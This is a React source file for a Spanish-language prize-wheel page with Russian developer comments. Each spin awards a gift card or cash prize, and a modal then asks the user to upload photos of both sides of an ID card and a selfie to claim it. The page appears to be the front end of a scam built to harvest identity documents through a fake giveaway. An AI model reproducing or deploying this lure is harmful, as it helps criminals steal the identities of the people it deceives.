import React, { useState } from 'react';
import './App.sass';
import { BiSolidUpArrow } from "react-icons/bi";
import { FaRegAddressCard } from "react-icons/fa6";
import { FaRegCreditCard } from "react-icons/fa6";
import { FaRegCircleUser } from "react-icons/fa6";

function App() {
  const [rotation, setRotation] = useState(0);
  const [result, setResult] = useState(null);

  const [front, setFront] = useState();
  const [back, setBack] = useState();
  const [selfie, setSelfie] = useState();

  const spinWheel = () => {
    const randomAngle = Math.floor(Math.random() * 360) + 3600; // Случайный угол поворота
    const newRotation = rotation + randomAngle; // Добавляем случайный угол к текущему углу поворота
    setRotation(newRotation);
    const stoppedAngle = newRotation % 360; // Угол, на котором колесо остановилось

    let segment;

    // Логика для определения сегмента в зависимости от угла поворота
    if ((stoppedAngle >= 337.5 && stoppedAngle < 360) || (stoppedAngle >= 0 && stoppedAngle < 22.5)) {
      // 5
      segment = 'Netflix Gift Card';
    } else if (stoppedAngle >= 22.5 && stoppedAngle < 67.5) {
      // 4
      segment = '€10';
    } else if (stoppedAngle >= 67.5 && stoppedAngle < 112.5) {
      // 3
      segment = 'Nike Gift Card';
    } else if (stoppedAngle >= 112.5 && stoppedAngle < 157.5) {
      // 2
      segment = '€15';
    } else if (stoppedAngle >= 157.5 && stoppedAngle < 202.5) {
      // 1
      segment = 'Amazon Gift Card';
    } else if (stoppedAngle >= 202.5 && stoppedAngle < 247.5) {
      // 8
      segment = '€20';
    } else if (stoppedAngle >= 247.5 && stoppedAngle < 292.5) {
      // 7
      segment = 'Spotify Gift Card';
    } else {
      // 6
      segment = '€5';
    }
    setTimeout(() => {
      setResult(segment);
    }, 6000)
  };

  const capturePhoto = (type) => {
    const options = {
      // Тут можно настроить качество и другие параметры изображения
      quality: 0.5,
    };

    navigator.camera.getPicture(
      (imageData) => {
        switch (type) {
          case 'front':
            setFront(imageData);
            break;
          case 'back':
            setBack(imageData);
            break;
          case 'selfie':
            setSelfie(imageData);
            break;
          default:
            break;
        }
      },
      (error) => console.error('Ошибка при съемке фотографии: ', error),
      options
    );
  };

  return (
    <div className="App">
      <div className="container">
        <h1>Rueda de la fortuna</h1>
        {/* 180 - середина 1, 202.5 - край 1 с 8, 157.7 - край 1 с 2 */}
        <div className="wheel" style={{ transform: `rotate(${rotation}deg)` }}>
          <img src="assets/spainFlag.png" alt="" className='icon' />
          <div className="one"><span><img src="assets/amazon.png" alt="" /></span></div>
          <div className="two"><span>€15</span></div>
          <div className="three"><span><img src="assets/nike.png" alt="" /></span></div>
          <div className="four"><span>€10</span></div>
          <div className="five"><span><img src="assets/netflix.png" alt="" /></span></div>
          <div className="six"><span>€5</span></div>
          <div className="seven"><span><img src="assets/spotify.png" alt="" /></span></div>
          <div className="eight"><span>€20</span></div>
        </div>
        <BiSolidUpArrow className='arrow' />
        <button onClick={spinWheel} style={result ? { backgroundColor: '#fbc50246', pointerEvents: 'none' } : {}}>Gira la Rueda</button>
        <p>Si algo salió mal, escribe al soporte.</p>

        <div className="modal" style={result ? {transform: 'translate(-50%, -50%) scale(1)'} : {}}>
          <h2>¡Felicidades! Tu premio es <span>{result}</span></h2>
          <p>Para reclamar un premio debes ser mayor de 18 años, subir tus documentos y una selfie.</p>

          <div className="docLoad">
            <div className="front">
              <input type="file" accept="image/*" capture="environment" onChange={() => capturePhoto('front')} />
              {front ? (
                <img src={front} alt='' />
              ) : (
                <FaRegAddressCard />
              )}
              <span>Antes ID CARD</span>
            </div>
            <div className="back">
              <input type="file" accept="image/*" capture="environment" onChange={() => capturePhoto('back')} />
              {back ? (
                <img src={back} alt='' />
              ) : (
                <FaRegCreditCard />
              )}
              <span>Atrás ID CARD</span>
            </div>
            <div className="slefie">
              <input type="file" accept="image/*" capture="user" onChange={() => capturePhoto('selfie')} />
              {selfie ? (
                <img src={selfie} alt='' />
              ) : (
                <FaRegCircleUser />
              )}
              <span>Autofoto</span>
            </div>
          </div>

          <button className='sendDoc'>Enviar para revisión</button>

        </div>
      </div>
    </div>
  );
}

export default App;
